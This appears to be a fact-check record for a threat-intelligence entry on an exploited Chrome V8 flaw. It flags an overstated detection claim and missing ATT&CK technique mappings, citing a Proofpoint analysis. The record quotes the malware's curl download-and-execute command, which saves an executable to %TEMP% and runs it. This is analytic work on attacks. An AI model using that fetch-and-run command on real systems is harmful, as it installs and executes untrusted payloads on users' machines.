- entry: entries/2026-09-04/cve-2026-85046-chrome-v8-type-confusion-exploited.md
  verdict: imprecision
  defects:
  - code: F4
    where: labelled line Detection
    claim: injected code makes the parent Chrome browser process run an operator-specified command. By default that is a command
      shell using curl to download an executable to the user's temp directory and run it ... and because the command is configurable,
      any shell or download utility started by the browser process deserves the same review.
    ground_truth: (low confidence) Proofpoint documents a fixed `curl -sS -o "%TEMP%\msgbox.exe" <exeUrl> && %TEMP%\msgbox.exe`
      command launched via CreateProcessA, and says only that the download URL comes from the kit configuration ('The exploit
      kit configuration constructs the download URL via the exeUrl variable'). It does not say the command itself is operator-specified
      or configurable; 'Default BlueMoon deployments feature a distinctive and suspicious process tree (chrome.exe -> cmd.exe
      -> curl.exe -> msgbox.exe)'.
    ground_truth_url: https://www.proofpoint.com/us/blog/threat-insight/once-bluemoon-multiple-state-aligned-threat-actors-rapidly-adopt-novel-exploit
    fix: '...makes the parent Chrome process run a curl download-and-execute command whose URL is set in the kit configuration;
      keep the broader ''any shell or download utility started by the browser process'' review as analyst inference.'
  - code: F11
    where: techniques
    claim: 'techniques: [T1189, T1203]'
    ground_truth: (low confidence) The Detection and chain paragraphs describe, from Proofpoint, a Windows kernel privilege-escalation
      flaw (T1068, active), process injection into the browser's parent process (T1055, active) and a curl download of an
      executable to %TEMP% (T1105, active), none of which is mapped.
    ground_truth_url: https://www.proofpoint.com/us/blog/threat-insight/once-bluemoon-multiple-state-aligned-threat-actors-rapidly-adopt-novel-exploit
    fix: Add T1068, T1055 and T1105 to techniques[].
